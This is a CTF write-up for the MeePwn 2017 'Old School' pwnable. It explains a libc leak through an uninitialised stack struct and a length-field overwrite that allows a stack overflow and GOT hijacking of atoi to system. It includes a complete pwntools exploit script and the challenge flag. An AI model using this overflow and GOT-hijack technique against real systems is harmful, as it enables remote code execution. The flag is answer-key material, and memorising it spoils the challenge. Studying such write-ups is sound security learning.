---
title: MeePwn CTF 2017 -- Old School
tags:
  - CTF
  - Python
  - Pwnable
  - MeePwn
  - BOF
categories:
  - write-ups
date: 2017-07-16 09:56:00
---
**Category:** Pwnable

64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.  
  
<!-- more -->  

```
-------- BookStore --------
1.       Add Book.
2.       Edit Book.
3.       Delete Book.
4.       Show Books.
5.       Exit.
```

As we can see we can add, edit, delete or show a book. Books are stored in a pointer array `books`, each pointer point to a `book` data structure:  

```c
struct book{
    char book_name[32];
    char author[32];
    int desc_len;
    char desc[256];
}
```

The `books` array and each `book` pointer are all placed on the stack memory.  

The program did not initialize the `book` variable before setting its data. Since there's a libc address ( `<atoi + 0x10>` ) in it, we can leak the libc address by entering 4 characters in the description:  
```
Choice:4
------------ 1 ------------
Name: 11111111
Author: 11111111
Description: AAAA�N���
-------- BookStore --------
1.       Add Book.
2.       Edit Book.
3.       Delete Book.
4.       Show Books.
5.       Exit.
```

After done some fuzzing, I also found that if we input 32 characters in `book_name` and `author` ( no newline ) , the `desc_len` will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the `desc_len` data, this make us able to overflow the `book->description` buffer and overwrite the pointers in the `books` array !  

So here's how I exploit the service:
1. First leak the libc address
2. Overwrite the `desc_len` data
3. Overflow the `books[0]->desc` buffer and overwrite `books[0]`, let it point to the GOT section
4. Edit `books[0]` and do the GOT hijacking ( hijack atoi to system )


The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won't let us input the `author` data, thus failing our exploit. Although we can still pwn it by not entering the author's name, it still took me a while to debug the whole process.  

```python exp_oldschool.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "139.59.244.42"
PORT = 31340
ELF_PATH = "./oldschool_noalarm"
LIBC_PATH = "./libc6_2.23-0ubuntu7_amd64.so"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object
libc = ELF(LIBC_PATH)

def add_book(book, author, dlen, desc):
    r.sendlineafter("Choice:", "1")
    r.sendafter("name:", book)
    r.sendafter("uthor:", author)
    r.sendlineafter("tion:", str(dlen))
    r.sendafter("tion:", desc)

def edit_book(idx, book, author, desc):
    r.sendlineafter("Choice:", "2")
    r.sendlineafter("?", str(idx))
    r.sendafter("name:", book)
    r.sendafter("uthor:", author)
    r.sendafter("tion:", desc)

def del_book(idx):
    r.sendlineafter("Choice:", "3")
    r.sendlineafter("?", str(idx))

def show_book():
    r.sendlineafter("Choice:", "4")


if __name__ == "__main__":

    r = remote(HOST, PORT)
   
    book, author = "1"*8+"\n", "a"*8+"\n"  
    add_book(book, author, 100, "AAAA\n")
    show_book()
    
    # leak libc
    r.recvuntil("AAAA")
    libc.address = u64(r.recv(6).ljust(8, "\x00")) - libc.symbols['atoi'] - 0x10
    log.success("libc_base: "+hex(libc.address))

    del_book(1)
    book, author = "1"*32, "a"*32  
    # make book[0]->size = very big
    # later when we edit book[0]->desc, it will overwrite the pointer of book[0]
    add_book(book, author, 100, "AAAA\n")
   
    # edit book[1]->desc, overwrite book[0]
    # change book[0]->name to got section
    # later we can edit book[0] & do GOT hijacking
    payload = "i"*503 + "\x00" + p32(1) + p64(0x602028) + "\n"
    edit_book(1, "1\n", "1\n", payload)

    # overwrite atoi to system
    payload = "i"*4 + p64(libc.symbols['system']) + "\n"
    book, author, desc = p64(0x400706)[:6:] , p64(0x4006f6)[:6:], payload
    r.sendlineafter("Choice:", "2")
    r.sendlineafter("?", "1")
    r.sendafter("name:", book)
    # don't know why author won't read input.....
    #r.sendafter("uthor:", author)
    r.sendafter("tion:", desc)
 
    r.sendline("sh")
    r.interactive()

```

flag: `MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}`





